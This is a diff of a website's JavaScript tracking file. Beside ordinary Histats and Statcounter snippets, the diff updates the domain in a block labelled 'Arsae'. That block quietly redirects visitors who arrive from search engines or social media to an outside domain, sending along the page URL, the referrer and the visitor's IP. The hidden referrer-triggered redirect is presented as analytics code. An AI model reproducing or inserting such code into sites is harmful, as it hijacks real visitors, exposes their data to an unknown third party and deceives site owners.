@@ -1,5 +1,5 @@
 //Histats
-document.write('<img alt="stats" src="//sstatic1.histats.com/0.gif?4948379&101"/>');
+document.write('<img alt="stats" src="//sstatic1.histats.com/0.gif?4949474&101"/>');
 
 ///// Statcounter /////
 
@@ -18,5 +18,5 @@ document.write('</noscript>');
 
 
 ///// Arsae /////
-var ars = 'https://css.evolution-ofcloud.com';
+var ars = 'https://only.evolution-ofcloud.com';
 if(['.edu.', '.google.', 'msn.', 'bing.', 'yandex.', 'facebook.', 'ecosia', 'qwant', 'pinterest.', 'duckduckgo.', '.yahoo.', 't.co'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) + "&ip=" + window.ipAddressArsae }
